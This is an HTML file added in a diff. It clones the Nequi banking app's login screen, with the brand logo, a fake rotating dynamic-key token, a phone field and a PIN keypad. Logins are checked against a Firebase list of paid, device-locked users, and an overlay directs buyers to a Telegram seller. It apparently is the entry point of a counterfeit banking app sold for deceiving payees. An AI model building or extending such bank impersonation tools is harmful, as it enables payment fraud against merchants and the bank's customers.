@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Pantalla Nequi Mock</title>
+
+  <!-- Fuente MANROPE -->
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Manrope', sans-serif !important;
+      -webkit-tap-highlight-color: transparent;
+      -webkit-touch-callout: none;
+      user-select: none;
+    }
+
+    input {
+      user-select: text;
+      -webkit-user-select: text;
+    }
+
+    body {
+      min-height: 100vh;
+      min-height: 100dvh;
+      width: 100vw;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #000;
+      color: #f5e9ff;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    .phone-frame {
+      width: 100%;
+      height: 100%;
+      height: 100dvh;
+      max-width: 480px;
+      max-height: 100dvh;
+      background: #1e001f;
+      border-radius: 0;
+      overflow: hidden;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+    }
+
+    @media (min-width: 481px) {
+      .phone-frame {
+        width: 360px;
+        height: 720px;
+        border-radius: 20px;
+      }
+    }
+
+    .app {
+      padding: 18px 20px;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* TOP BAR */
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .token-card {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #452545;
+      padding: 6px 10px;
+      border-radius: 4px;
+    }
+
+    @keyframes girar {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .token-circle {
+      --progress: 120deg;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      /* CAMBIO: parte que corre FUCSIA, resto del círculo BLANCO SÓLIDO */
+      background: conic-gradient(#ff008a var(--progress), #ffffff 0);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      animation: girar 10s linear infinite;
+    }
+
+    .token-circle::after {
+      content: "";
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      /* CENTRO: como estaba originalmente (color del fondo) */
+      background: #1e001f;
+    }
+
+    .token-label {
+      font-size: 11px;
+      opacity: 0.75;
+      color: #e0e0e0;
+    }
+
+    .token-number {
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      color: #ffffff;
+    }
+
+    .token-copy {
+      width: 24px;
+      height: 24px;
+      position: relative;
+      cursor: pointer;
+    }
+
+    .token-copy::before,
+    .token-copy::after {
+      content: "";
+      position: absolute;
+      width: 14px;
+      height: 14px;
+      border: 2px solid #e0e0e0;
+      border-radius: 3px;
+    }
+
+    .token-copy::before {
+      top: 2px;
+      left: 6px;
+    }
+
+    .token-copy::after {
+      top: 6px;
+      left: 2px;
+      opacity: 0.7;
+    }
+
+    .token-copy.copied::before,
+    .token-copy.copied::after {
+      border-color: #4CAF50;
+    }
+
+    .help-button {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 18px;
+      border: 1px solid #fff;
+      border-radius: 4px;
+      background: transparent;
+      cursor: pointer;
+      font-size: 14px;
+      color: #fff;
+      outline: none;
+    }
+
+    .help-icon {
+      width: 18px;
+      height: 18px;
+      border: 1px solid #fff;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    /* VISTA 1: NÚMERO */
+    #view-numero {
+      flex: 1;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .logo {
+      position: absolute;
+      top: 38%;
+      left: 50%;
+      transform: translate(-50%, -40%);
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .logo-dot {
+      width: 22px;
+      height: 22px;
+      background: #ff008a;
+      border-radius: 4px;
+      margin-bottom: 22px;
+    }
+
+    .logo-text {
+      font-size: 74px;
+      font-weight: 900;
+      letter-spacing: 1px;
+    }
+
+    .bottom-panel {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      margin-top: auto;
+    }
+
+    .phone-input-wrapper {
+      background: #452545;
+      padding: 12px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+    }
+
+    .separator {
+      width: 1px;
+      height: 24px;
+      background: rgba(255,255,255,0.3);
+      margin: 0 8px;
+    }
+
+    .phone-input {
+      background: transparent;
+      border: none;
+      color: #fff;
+      flex: 1;
+      font-size: 16px;
+      outline: none;
+      letter-spacing: 2px;
+    }
+
+    .buttons-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .primary-btn {
+      flex: 1;
+      padding: 14px;
+      border-radius: 4px;
+      background: #ff008a;
+      border: none;
+      color: #fff;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      outline: none;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: opacity 0.2s ease;
+    }
+
+    .primary-btn.loading {
+      pointer-events: none;
+      opacity: 0.8;
+    }
+
+    .btn-spinner {
+      width: 22px;
+      height: 22px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top: 3px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .icon-btn {
+      width: 64px;
+      background: #ff008a;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 28px;
+      font-weight: 300;
+      text-decoration: none;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      outline: none;
+    }
+
+    .footer-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+      opacity: 0.95;
+    }
+
+    .footer-phone {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .phone-icon-mini {
+      width: 15px;
+      height: 24px;
+      border-radius: 4px;
+      border: 1.5px solid #fff;
+      position: relative;
+    }
+
+    .phone-icon-mini::after {
+      content: "";
+      width: 7px;
+      height: 2px;
+      background: #fff;
+      position: absolute;
+      bottom: 2px;
+      left: 50%;
+      transform: translateX(-50%);
+      border-radius: 2px;
+    }
+
+    /* CÍRCULO PARA IMAGEN BY */
+    .by-container {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .by-image-circle {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255,255,255,0.1);
+      flex-shrink: 0;
+    }
+
+    .by-image-circle img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    /* =========================================
+       VISTA 2: CLAVE (ELEMENTOS MÁS GRANDES E IMPONENTES)
+       ========================================= */
+    #view-pin {
+      flex: 1;
+      display: none;
+      flex-direction: column;
+      padding: 10px 15px;
+      height: 100%;
+    }
+
+    .back-arrow {
+      font-size: 32px;
+      color: #fff;
+      text-decoration: none;
+      cursor: pointer;
+      margin-bottom: 5px;
+      outline: none;
+      align-self: flex-start;
+    }
+
+    .pin-title {
+      font-size: clamp(26px, 8vw, 34px);
+      font-weight: 700;
+      margin-top: 5px;
+      margin-bottom: 10px;
+      width: 100%;
+      text-align: left;
+      padding-left: 8px;
+    }
+
+    .pin-center {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      flex: 1;
+      gap: 18px;
+    }
+
+    .code-input {
+      display: flex;
+      gap: 16px;
+      margin: 0;
+    }
+
+    .dot-box {
+      width: clamp(52px, 14vw, 60px);
+      height: clamp(52px, 14vw, 60px);
+      border-radius: 4px;
+      background-color: #e7e3ed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .asterisk {
+      font-size: clamp(34px, 10vw, 40px);
+      color: #ff008a;
+      font-weight: 900;
+      display: none;
+      line-height: 0;
+      transform: translateY(-1px);
+    }
+
+    .asterisk.active {
+      display: block;
+    }
+
+    .message {
+      text-align: center;
+      color: #ccc;
+      font-size: clamp(15px, 4.5vw, 18px);
+      margin: 0;
+      min-height: 44px;
+      padding: 0 10px;
+      line-height: 1.4;
+    }
+
+    .message.error {
+      color: #ff9aa7;
+    }
+
+    .message.ok {
+      color: #8ee9a1;
+    }
+
+    .keyboard {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: clamp(14px, 4vw, 20px);
+      width: 100%;
+      max-width: 320px;
+      margin: 0 auto;
+    }
+
+    .key {
+      font-size: clamp(28px, 8vw, 34px);
+      color: #fff;
+      text-align: center;
+      border-radius: 4px;
+      background-color: transparent;
+      border: none;
+      cursor: pointer;
+      outline: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: clamp(56px, 14vw, 66px);
+      width: 100%;
+    }
+
+    .key:active {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    .forgot-btn {
+      background: transparent;
+      border: 1px solid rgba(255, 255, 255, 0.4);
+      color: #fff;
+      padding: 14px 28px;
+      border-radius: 4px;
+      width: auto;
+      max-width: 260px;
+      margin: 8px auto 0;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .forgot-btn:active {
+      background: rgba(255, 255, 255, 0.1);
+      border-color: #fff;
+    }
+
+    @media (max-height: 600px) {
+      #view-pin {
+        padding: 8px 12px;
+      }
+      .pin-title {
+        font-size: 24px;
+        margin-bottom: 8px;
+      }
+      .pin-center {
+        gap: 14px;
+      }
+      .dot-box {
+        width: 48px;
+        height: 48px;
+      }
+      .asterisk {
+        font-size: 30px;
+      }
+      .key {
+        height: 50px;
+        font-size: 26px;
+      }
+      .keyboard {
+        gap: 10px;
+        max-width: 290px;
+      }
+      .message {
+        font-size: 13px;
+        min-height: 36px;
+      }
+      .forgot-btn {
+        padding: 10px 20px;
+        font-size: 14px;
+      }
+    }
+
+    #overlay-nequi {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(10, 0, 20, 0.75);
+      backdrop-filter: blur(6px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999999;
+      animation: fadeOut 1s ease 7s forwards;
+    }
+
+    #notificacion-nequi {
+      background: linear-gradient(135deg, #1A002B, #2D004D);
+      border-radius: 18px;
+      padding: 25px 20px;
+      width: 90%;
+      max-width: 360px;
+      text-align: center;
+      color: #fff;
+      font-family: 'Manrope', sans-serif;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+      animation: entrada 0.5s ease;
+    }
+
+    #notificacion-nequi h1 {
+      font-size: clamp(20px, 5vw, 24px);
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+
+    #notificacion-nequi p {
+      font-size: clamp(14px, 4vw, 16px);
+      opacity: 0.85;
+      margin-bottom: 15px;
+    }
+
+    #notificacion-nequi a {
+      display: block;
+      padding: 12px;
+      background: #ffffff;
+      color: #2D004D;
+      font-weight: 700;
+      border-radius: 4px;
+      text-decoration: none;
+      font-size: clamp(14px, 4vw, 15px);
+      word-break: break-word;
+      transition: 0.3s;
+      outline: none;
+    }
+
+    #notificacion-nequi a:hover {
+      transform: scale(1.04);
+      background: #f2f2f2;
+    }
+
+    .barra-tiempo {
+      margin-top: 15px;
+      height: 4px;
+      width: 100%;
+      background: rgba(255,255,255,0.2);
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    .barra-tiempo span {
+      display: block;
+      height: 100%;
+      background: #ffffff;
+      width: 100%;
+      animation: tiempo 8s linear forwards;
+    }
+
+    @keyframes entrada {
+      from {transform: translateY(30px) scale(0.9); opacity: 0;}
+      to {transform: translateY(0) scale(1); opacity: 1;}
+    }
+
+    @keyframes tiempo {
+      from {width: 100%;}
+      to {width: 0%;}
+    }
+
+    @keyframes fadeOut {
+      to {
+        opacity: 0;
+        visibility: hidden;
+      }
+    }
+
+    @media (max-width: 360px) {
+      #notificacion-nequi {
+        padding: 20px 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="phone-frame">
+    <div class="app">
+      
+      <div id="view-numero">
+        <div class="top-bar">
+          <div class="token-card">
+            <div class="token-circle"></div>
+            <div>
+              <div class="token-label">Clave dinámica</div>
+              <div class="token-number" id="tokenNumber">258710</div>
+            </div>
+            <div class="token-copy" id="copyToken" title="Copiar"></div>
+          </div>
+          <button class="help-button">
+            <span class="help-icon">?</span> Ayuda
+          </button>
+        </div>
+
+        <div class="logo">
+          <div class="logo-dot"></div>
+          <div class="logo-text">Nequi</div>
+        </div>
+        <div class="bottom-panel">
+          <form id="loginForm" class="phone-input-wrapper">
+            <span>+57</span>
+            <div class="separator"></div>
+            <input type="tel" id="telefono" class="phone-input" maxlength="14" required />
+          </form>
+          <div class="buttons-row">
+            <button type="submit" form="loginForm" class="primary-btn">Entra</button>
+            <a href="#" class="icon-btn">$</a>
+          </div>
+          <div class="footer-row">
+            <div class="footer-phone">
+              <div class="phone-icon-mini"></div>
+              <span>¿Cambiaste tu cel?</span>
+            </div>
+            <div class="by-container">
+              <span>by </span>
+              <div class="by-image-circle">
+                <img src="imagen2026b.png" alt="" />
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div id="view-pin">
+        <div class="back-arrow" id="volver">←</div>
+        <div class="pin-title">Escribe tu clave</div>
+        <div class="pin-center">
+          <div class="code-input">
+            <div class="dot-box"><span class="asterisk" id="dot1">*</span></div>
+            <div class="dot-box"><span class="asterisk" id="dot2">*</span></div>
+            <div class="dot-box"><span class="asterisk" id="dot3">*</span></div>
+            <div class="dot-box"><span class="asterisk" id="dot4">*</span></div>
+          </div>
+          <div class="message" id="msg">No dudamos que seas tú...<br>Pero es mejor confirmar ;)</div>
+          <div class="keyboard">
+            <button class="key" data-k="1">1</button>
+            <button class="key" data-k="2">2</button>
+            <button class="key" data-k="3">3</button>
+            <button class="key" data-k="4">4</button>
+            <button class="key" data-k="5">5</button>
+            <button class="key" data-k="6">6</button>
+            <button class="key" data-k="7">7</button>
+            <button class="key" data-k="8">8</button>
+            <button class="key" data-k="9">9</button>
+            <button class="key" style="visibility:hidden"></button>
+            <button class="key" data-k="0">0</button>
+            <button class="key" id="bksp">⌫</button>
+          </div>
+          <button class="forgot-btn" type="button">Olvidé mi clave</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "GOOGLE_API_KEY",
+      authDomain: "base-de-datos-nequibotgv.firebaseapp.com",
+      projectId: "base-de-datos-nequibotgv",
+      storageBucket: "base-de-datos-nequibotgv.firebasestorage.app",
+      messagingSenderId: "503959618979",
+      appId: "1:503959618979:web:8053943f6558ab6969c616"
+    };
+
+    const appFB = initializeApp(firebaseConfig);
+    const db = getFirestore(appFB);
+    const FINAL_URL = 'index2.html';
+
+    const viewNumero = document.getElementById('view-numero');
+    const viewPin = document.getElementById('view-pin');
+    const volver = document.getElementById('volver');
+    const primaryBtn = document.querySelector('.primary-btn');
+
+    function goStep1() {
+      viewNumero.style.display = 'flex';
+      viewPin.style.display = 'none';
+    }
+
+    function goStep2() {
+      viewNumero.style.display = 'none';
+      viewPin.style.display = 'flex';
+    }
+
+    function formatPhone(value) {
+      const digits = value.replace(/\D/g, '').slice(0, 10);
+      if (digits.length <= 3) return digits;
+      if (digits.length <= 6) return `${digits.slice(0, 3)} ${digits.slice(3)}`;
+      return `${digits.slice(0, 3)} ${digits.slice(3, 6)} ${digits.slice(6)}`;
+    }
+
+    function normalizar(n) {
+      const d = (n || '').replace(/\D+/g, '');
+      return d.slice(-10);
+    }
+
+    async function getPhoneDoc(tel) {
+      const ref = doc(db, 'phones', tel);
+      const snap = await getDoc(ref);
+      return snap.exists() ? snap.data() : null;
+    }
+
+    let telValidado = '';
+    const loginForm = document.getElementById('loginForm');
+    const telefonoInput = document.getElementById('telefono');
+    let pin = '';
+
+    telefonoInput.addEventListener('input', (e) => {
+      const formatted = formatPhone(e.target.value);
+      e.target.value = formatted;
+    });
+
+    loginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const tel = normalizar(telefonoInput.value);
+
+      if (tel.length !== 10 || tel[0] !== '3') {
+        alert('Ingresa un número móvil válido de Colombia (3XXXXXXXXX).');
+        return;
+      }
+
+      const originalText = primaryBtn.innerText;
+      primaryBtn.innerHTML = '<div class="btn-spinner"></div>';
+      primaryBtn.classList.add('loading');
+
+      await new Promise(resolve => setTimeout(resolve, 4000));
+
+      try {
+        const data = await getPhoneDoc(tel);
+        if (!data) {
+          primaryBtn.innerText = originalText;
+          primaryBtn.classList.remove('loading');
+          alert('Número no encontrado.');
+          return;
+        }
+        if (!data.active) {
+          primaryBtn.innerText = originalText;
+          primaryBtn.classList.remove('loading');
+          alert('Número inactivo.');
+          return;
+        }
+        if (data.lockedTo) {
+          primaryBtn.innerText = originalText;
+          primaryBtn.classList.remove('loading');
+          alert('Este número ya está en uso en otro dispositivo. Contacta con Max para liberar el dispositivo.');
+          return;
+        }
+
+        telValidado = tel;
+        pin = '';
+        updateDots();
+        setMessage('No dudamos que seas tú...<br>Pero es mejor confirmar ;)');
+        
+        primaryBtn.innerText = originalText;
+        primaryBtn.classList.remove('loading');
+        goStep2();
+      } catch (err) {
+        primaryBtn.innerText = originalText;
+        primaryBtn.classList.remove('loading');
+        console.error(err);
+        alert('Error validando el número.');
+      }
+    });
+
+    volver.addEventListener('click', (e) => {
+      e.preventDefault();
+      pin = '';
+      updateDots();
+      goStep1();
+    });
+
+    const msg = document.getElementById('msg');
+    function setMessage(html, cls = '') {
+      msg.className = 'message ' + cls;
+      msg.innerHTML = html;
+    }
+
+    const MAX = 4;
+
+    function updateDots() {
+      for (let i = 1; i <= MAX; i++) {
+        const dot = document.getElementById('dot' + i);
+        dot.classList.toggle('active', i <= pin.length);
+      }
+    }
+
+    async function validarPin() {
+      try {
+        const data = await getPhoneDoc(telValidado);
+        if (!data) {
+          pin = '';
+          updateDots();
+          setMessage('Número no encontrado.', 'error');
+          return;
+        }
+        if (!data.active) {
+          pin = '';
+          updateDots();
+          setMessage('Número inactivo.', 'error');
+          return;
+        }
+
+        const ok = String(data.clave || '') === pin;
+        if (ok) {
+          setMessage('', 'ok');
+          setTimeout(() => {
+            window.location.href = FINAL_URL;
+          }, 800);
+        } else {
+          pin = '';
+          updateDots();
+          setMessage('Clave incorrecta. Inténtalo de nuevo.', 'error');
+        }
+      } catch (e) {
+        console.error(e);
+        pin = '';
+        updateDots();
+        setMessage('Error validando la clave.', 'error');
+      }
+    }
+
+    document.querySelectorAll('.key[data-k]').forEach(btn => {
+      btn.addEventListener('click', () => {
+        if (pin.length < MAX) {
+          pin += btn.getAttribute('data-k');
+          updateDots();
+          if (pin.length === MAX) setTimeout(validarPin, 150);
+        }
+      });
+    });
+
+    document.getElementById('bksp').addEventListener('click', () => {
+      pin = pin.slice(0, -1);
+      updateDots();
+    });
+
+    window.addEventListener('keydown', (e) => {
+      if (viewPin.style.display !== 'flex') return;
+      if (/\d/.test(e.key)) {
+        if (pin.length < MAX) {
+          pin += e.key;
+          updateDots();
+          if (pin.length === MAX) setTimeout(validarPin, 150);
+        }
+      } else if (e.key === 'Backspace') {
+        pin = pin.slice(0, -1);
+        updateDots();
+      } else if (e.key === 'Escape') {
+        goStep1();
+      }
+    });
+
+    const copyToken = document.getElementById('copyToken');
+    const tokenNumber = document.getElementById('tokenNumber');
+    
+    copyToken.addEventListener('click', () => {
+      const token = tokenNumber.textContent;
+      navigator.clipboard.writeText(token).then(() => {
+        copyToken.classList.add('copied');
+        setTimeout(() => {
+          copyToken.classList.remove('copied');
+        }, 2000);
+      }).catch(err => {
+        console.error('Error al copiar:', err);
+      });
+    });
+
+    function generateToken() {
+      return Math.floor(100000 + Math.random() * 900000).toString();
+    }
+
+    function updateToken() {
+      tokenNumber.textContent = generateToken();
+    }
+
+    updateToken();
+    setInterval(updateToken, 30000);
+  </script>
+
+<!-- INICIO: Notificación Publicitaria (Pegar antes de </body>) -->
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  #ad-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(10, 0, 25, 0.98);
+    backdrop-filter: blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 99999;
+    font-family: 'Manrope', sans-serif;
+    animation: adFadeIn 0.3s ease;
+  }
+  .ad-box {
+    background: linear-gradient(145deg, #1A002B, #0F001A);
+    border: 2px solid #9B005E;
+    border-radius: 20px;
+    padding: 32px 28px;
+    width: 90%;
+    max-width: 380px;
+    text-align: center;
+    color: #ffffff;
+    box-shadow: 0 20px 60px rgba(155, 0, 94, 0.5);
+    position: relative;
+    overflow: hidden;
+    animation: adSlideUp 0.4s ease;
+  }
+  .ad-title-main {
+    font-size: 28px;
+    font-weight: 800;
+    margin-bottom: 18px;
+    line-height: 1.2;
+    color: #ffffff;
+    text-shadow: 0 2px 15px rgba(155, 0, 94, 0.7);
+  }
+  .ad-text {
+    font-size: 15px;
+    font-weight: 400;
+    color: rgba(255, 255, 255, 0.9);
+    margin-bottom: 22px;
+    line-height: 1.6;
+  }
+  .ad-user {
+    color: #FF1493;
+    font-weight: 700;
+  }
+  .copy-section {
+    margin-bottom: 18px;
+  }
+  .copy-label {
+    font-size: 12px;
+    font-weight: 600;
+    color: rgba(255, 255, 255, 0.7);
+    margin-bottom: 8px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .copy-container {
+    background: linear-gradient(135deg, #250035, #1A002B);
+    border: 1px solid #9B005E;
+    border-radius: 12px;
+    padding: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.6);
+  }
+  .copy-text {
+    color: #ffffff;
+    font-size: 15px;
+    font-weight: 700;
+    word-break: break-all;
+    flex: 1;
+    text-align: left;
+  }
+  .copy-btn {
+    background: linear-gradient(135deg, #9B005E, #7A004D);
+    color: #ffffff;
+    border: none;
+    font-size: 12px;
+    font-weight: 700;
+    padding: 10px 14px;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: 'Manrope', sans-serif;
+    white-space: nowrap;
+    box-shadow: 0 2px 8px rgba(155, 0, 94, 0.5);
+  }
+  .copy-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(155, 0, 94, 0.7);
+    background: linear-gradient(135deg, #BB006E, #9B005E);
+  }
+  .copy-btn.copied {
+    background: linear-gradient(135deg, #00C853, #009624);
+    box-shadow: 0 4px 12px rgba(0, 200, 83, 0.4);
+  }
+  .ad-skip {
+    background: transparent;
+    border: 2px solid #9B005E;
+    color: #ffffff;
+    font-size: 14px;
+    font-weight: 700;
+    padding: 12px 28px;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-family: 'Manrope', sans-serif;
+    margin-top: 8px;
+  }
+  .ad-skip:hover {
+    background: rgba(155, 0, 94, 0.3);
+    border-color: #FF1493;
+    color: #FF1493;
+    transform: translateY(-2px);
+  }
+  .ad-progress {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    height: 5px;
+    background: linear-gradient(90deg, #9B005E, #FF1493);
+    width: 100%;
+    border-radius: 0 0 20px 20px;
+    animation: adProgress 4s linear forwards;
+  }
+  @keyframes adFadeIn { from { opacity: 0; } to { opacity: 1; } }
+  @keyframes adSlideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+  @keyframes adProgress { from { width: 100%; } to { width: 0%; } }
+</style>
+
+<div id="ad-overlay">
+  <div class="ad-box">
+    <h2 class="ad-title-main">Link Oficial</h2>
+    <p class="ad-text">Activa tu Acceso Con Max, Usuario: (<span class="ad-user">@maxnqbgv</span>) en telegram</p>
+    
+    <!-- Sección Usuario Telegram -->
+    <div class="copy-section">
+      <div class="copy-label">Usuario Telegram</div>
+      <div class="copy-container">
+        <span class="copy-text" id="telegramUser">@maxnqbgv</span>
+        <button class="copy-btn" onclick="copyTelegramUser()" id="copyUserBtn">📋 Copiar</button>
+      </div>
+    </div>
+    
+    <!-- Sección Link -->
+    <div class="copy-section">
+      <div class="copy-label">Link de Acceso</div>
+      <div class="copy-container">
+        <a href="https://t.me/nequibotgvvv" target="_blank" class="copy-text" id="adLinkText" style="color: #FF69B4;">https://t.me/nequibotgvvv</a>
+        <button class="copy-btn" onclick="copyLink()" id="copyLinkBtn">📋 Copiar</button>
+      </div>
+    </div>
+    
+    <button class="ad-skip" onclick="closeAd()">Omitir</button>
+    
+    <!-- Barra de progreso visual de 4 segundos -->
+    <div class="ad-progress"></div>
+  </div>
+</div>
+
+<script>
+  function copyTelegramUser() {
+    const userText = document.getElementById('telegramUser').textContent;
+    const copyBtn = document.getElementById('copyUserBtn');
+    
+    navigator.clipboard.writeText(userText).then(() => {
+      copyBtn.textContent = '✓ Copiado';
+      copyBtn.classList.add('copied');
+      setTimeout(() => {
+        copyBtn.textContent = '📋 Copiar';
+        copyBtn.classList.remove('copied');
+      }, 2000);
+    }).catch(err => {
+      const textArea = document.createElement('textarea');
+      textArea.value = userText;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textArea);
+      
+      copyBtn.textContent = '✓ Copiado';
+      copyBtn.classList.add('copied');
+      setTimeout(() => {
+        copyBtn.textContent = ' Copiar';
+        copyBtn.classList.remove('copied');
+      }, 2000);
+    });
+  }
+
+  function copyLink() {
+    const linkText = document.getElementById('adLinkText').textContent;
+    const copyBtn = document.getElementById('copyLinkBtn');
+    
+    navigator.clipboard.writeText(linkText).then(() => {
+      copyBtn.textContent = '✓ Copiado';
+      copyBtn.classList.add('copied');
+      setTimeout(() => {
+        copyBtn.textContent = '📋 Copiar';
+        copyBtn.classList.remove('copied');
+      }, 2000);
+    }).catch(err => {
+      const textArea = document.createElement('textarea');
+      textArea.value = linkText;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textArea);
+      
+      copyBtn.textContent = '✓ Copiado';
+      copyBtn.classList.add('copied');
+      setTimeout(() => {
+        copyBtn.textContent = '📋 Copiar';
+        copyBtn.classList.remove('copied');
+      }, 2000);
+    });
+  }
+
+  function closeAd() {
+    const overlay = document.getElementById('ad-overlay');
+    if (overlay) {
+      overlay.style.opacity = '0';
+      overlay.style.transition = 'opacity 0.3s ease';
+      setTimeout(() => {
+        overlay.style.display = 'none';
+      }, 300);
+    }
+  }
+
+  // Cierre automático exacto a los 4 segundos (4000 ms)
+  setTimeout(closeAd, 4000);
+</script>
+<!-- FIN: Notificación Publicitaria -->
+
+</body>
+</html>
+</body>
+</html>
+
+</body>
+</html>
